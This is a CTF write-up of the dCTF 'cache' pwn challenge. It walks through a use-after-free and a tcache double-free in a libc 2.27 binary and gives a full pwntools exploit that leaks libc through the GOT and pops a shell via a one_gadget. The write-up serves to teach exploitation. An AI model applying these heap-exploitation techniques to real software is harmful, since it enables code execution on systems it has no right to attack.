---
title: dCTF - cache (pwn)
date: 2022-02-13T00:00:00Z
draft: false
description: heap, uaf, double free
tocOpen: true
---

After many lazy months and a long hiatus, I finally found some time to sit down and see through a slightly less than trivial pwn challenge.

Competed under the team `xiao zhu zhus` alongside my other xiao zhu zhu in the team.

## Overview

> Can you catch me?
>
> Flag format: CTF{sha256}
>
> Files: [vuln.zip](attachments/vuln.zip)


## Trivial Preview
---

Right off the bat, we are provided with the vulnerable program `vuln` as well as the `libc` used for this program in the remote server.

With a quick run, we can notice that this program uses a libc version `2.27` which is widely known to feature an **extremely broken tcache** lol

Running `checksec` on the program tells us about the securities that are enabled in the program.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Analysis
---

Decompiling the program, we have ourselves a simple and straightforward pseudocode as shown below.

```c
void init()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
}

int getFlag()
{
  return execlp("cat", "cat", "flag.txt", 0LL);
}

int admin_info()
{
  return puts("I am an admin");
}

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-1Ch] BYREF
  void *buf; // [rsp+8h] [rbp-18h]
  void *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buf = 0LL;
  ptr = 0LL;
  init();
  while ( 1 )
  {
    puts("MENU");
    puts("1: Make new admin");
    puts("2: Make new user");
    puts("3: Print admin info");
    puts("4: Edit Student Name");
    puts("5: Print Student Name");
    puts("6: Delete admin");
    puts("7: Delete user");
    printf("\nChoice: ");
    fflush(stdout);
    __isoc99_scanf("%d%*c", &v3);
    switch ( v3 )
    {
      case 1:
        ptr = malloc(0x10uLL);
        *((_QWORD *)ptr + 1) = admin_info;
        *(_QWORD *)ptr = getFlag;
        break;
      case 2:
        buf = malloc(0x10uLL);
        printf("What is your name: ");
        fflush(stdout);
        read(0, buf, 0x10uLL);
        break;
      case 3:
        (*((void (**)(void))ptr + 1))();
        break;
      case 4:
        printf("What is your name: ");
        fflush(stdout);
        read(0, buf, 0x10uLL);
        break;
      case 5:
        if ( buf )
          printf("Students name is %s\n", (const char *)buf);
        else
          puts("New student has not been created yet");
        break;
      case 6:
        free(ptr);
        break;
      case 7:
        free(buf);
        break;
      default:
        puts("bad input");
        break;
    }
  }
}
```

The program basically features a very interesting `getFlag()` function which seemingly runs `cat flag` and should give us a flag.

On having a deeper look, we make a few observations

1. Options 6 and 7 free some chunks of the memory but does not clear the pointer to these chunks. This gives us a **Use After Free** vulnerability as we can continue to reuse these pointers despite the memory being already freed.
2. Option 3 seems to be intended to run `admin_info()` in an extremely odd way by directly running the function from the memory of the allocated chunk `buf`.

With that, we pretty much have the necessary things we need to start exploiting the program.

## Exploit Strategy
---

Using our **UAF** vulnerability, we can `Make new admin` which allocates a chunk and initializes a `buf` pointer to that chunk.

```
0x603250				0x0000000000000021	........!.......
0x603260	0x000000000040084a	0x0000000000400875	J.@.....u.@.....	<- buf
0x603270	0x0000000000000000	0x0000000000020d91	................	
```

As you can see, we have the `admin_info` and `getFlag` function addresses in the chunk. If we attempt to `print admin info (option 3)`, it will directly run the function at `0x000000000040084a` which corresponds to the `admin_info` function address.

If we can somehow overwrite  with the `getFlag` function address, we pretty much will be able to call `getFlag`.

We will free this `buf` chunk, and then allocate a `ptr` chunk which will be reallocated the same memory by the memory allocator. This will give us a chunk with both `buf` and `ptr` pointing to the same place.

```
0x603250				0x0000000000000021	........!.......
0x603260	0x000000000040084a	0x0000000000400875	J.@.....u.@.....	<- buf & ptr
0x603270	0x0000000000000000	0x0000000000020d91	................	
```

Looking at the pseudocode once again, we are able to write `0x10` of data into the chunk and thus allow us to overwrite `admin_info` address with `getFlag`.

```c
      case 2:
        buf = malloc(0x10uLL);
        printf("What is your name: ");
        fflush(stdout);
        read(0, buf, 0x10uLL);
```

Since the `buf` pointer still points to the same chunk despite being previously freed, we will be able to run the supposed `admin_info` function which we will overwrite to poin to `getFlag`.

After writing `AAAAAAAA + p64(getFlag)`, our heap will look like this

```
0x1bb5250				0x0000000000000021	........!.......
0x1bb5260	0x4141414141414141	0x000000000040084a	AAAAAAAAJ.@.....	<-- buf & ptr
0x1bb5270	0x0000000000000000	0x0000000000020d91	................	<-- Top chunk
```

Running `print admin info` in our menu will `cat flag.txt` instead and hence call our `getFlag function`.

## Win!
---

Running the exploit on remote returns us our glorious flag...

```
Try Harder!!! https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

Trust me. The flag is in the youtube link.

<br><br>

## Rethinking Life Choices
---

I'm not exactly a fan of getting rick-rolled, but it is apparent that we need to get a shell on this challenge to get our real flag.

However, there is little in the binary that can help us to get our flag itself. This calls for us to get a **libc** leak so we can preferably use a **one_gadget** to get us a shell.

This brings my attention to the `print student name` function which basically prints whatever is in the allocated memory until it hits a null terminator. 

If I could *somehow* allocate `buf` to the **Global Offset Table**, I will be able to leak libc function addresses and thus calculate the address of a **one_gadget** and use the same method as that of the prior exploit to pop my shell.

In order to allocate our `buf` chunk to an arbitrary place in memory, we can make use of the `tcache dup` vulnerability where we can free the same pointer multiple times. 

## Exploit Walkthrough
---

1. We will first `malloc` a `buf` chunk in memory and then free it three times.
2. This creates a tcache linked list that looks like this

```
tcachebins
0x20 [  3]: 0xabb260 ◂— 0xabb260
```

3. We can then modify the data within the chunk to make the linked list point to a **Global Offset Table** address, so that future chunks can be allocated there. 

```
tcachebins
0x20 [  3]: 0xabb260 —▸ 0x602028 (setbuf@got.plt) —▸ 0x7f08a633c4d0 (setbuf) ◂— mov    edx, 0x2000
```

4. We then allocated one chunk to use up the first value in our free list. The next chunk afterwards will be allocated to `setbuf` in the **Global Offset Table**, and we will leave the data as a single '\n' character.

5. We can then **print student name**, which will give us the address of `setbuf` in the libc. Keep in mind that we have earlier overwritten the last byte of the address with a '\n' character. However we know that the last byte is always constant and will be `\xd0`.

6. After obtaining our `stdbuf` address, we can calculate our `libc` base address and thus redo the initial exploit but instead of pointing to `getFlag`, we point to a `one_gadget` in the `libc` and thus get our shell.

## Final Exploit script
---
> Keep in mind that the exploit script was adapted to suit certain restrictions and prevent from crashing.
>
> Also keep in mind that `setbuf` was chosen instead of other functions in the `GOT` simply because it will not be called again and accidentally overwriting the last byte in the `GOT` will not cause us to `SEGFAULT` as we will not be calling `setbuf` anytime in th e remaining of the program.

```py
# coding: utf-8
from pwn import *

context.binary = elf = ELF("./vuln_patched")
libc = elf.libc
p = process('./vuln_patched')

#: set up tcache dup to allocate buf to SETBUF in GOT
p.sendlineafter("Choice: ", "2")			# setup buf pointer 
p.sendlineafter("What is your name: ", "")
p.sendlineafter("Choice: ", "7")			# free chunk for reuse
p.sendlineafter("Choice: ", "1")			# reuse chunk
p.sendlineafter("Choice: ", "6")			# set up linked list
p.sendlineafter("Choice: ", "6")
p.sendlineafter("Choice: ", "6")
p.sendlineafter("Choice: ", "4")			# modify linked list to point to setbuf
p.sendlineafter("What is your name: ", p64(elf.got.setbuf))
p.sendlineafter("Choice: ", "2")			# eat up extra freed chunk
p.sendlineafter("What is your name: ", "")
p.sendlineafter("Choice: ", "2")			# allocate chunk to setbuf in GOT
p.sendlineafter("What is your name: ", "")

# print and obtain setbuf address
p.sendline("5")				# print leak
p.recvuntil("Students name is \n")
setbuf_leak = unpack(b'\xd0' + p.recvline().strip(), 'all')
log.info(f'leak = {hex(setbuf_leak)}')

# calculate one_gadget address
libc.address = setbuf_leak - libc.sym.setbuf
one_gadget = libc.address + 0x10a38c
log.info(f'gadget = {hex(one_gadget)}')

# using UAF exploit, run arbitrary functions instead of admin_info function
p.sendlineafter("Choice: ", "6")			# free extra buffer chunk to prevent from allocating to inside setbuf in libc
p.sendlineafter("Choice: ", "1")			# set buf
p.sendlineafter("Choice: ", "6")			# leave buf ptr behind and free
p.sendlineafter("Choice: ", "2")			# reuse buf chunk
payload = b"A" * 8 + p64(one_gadget)			# overwrite admin_info to one_gadget
p.sendlineafter("What is your name: ", payload)
p.sendlineafter("Choice: ", "3")			# call one_gadget

# shell
p.interactive()
```

<br>

_there were many redundant steps in the exploit that can be simplified, do feel free to simplify the exploit yourself!_
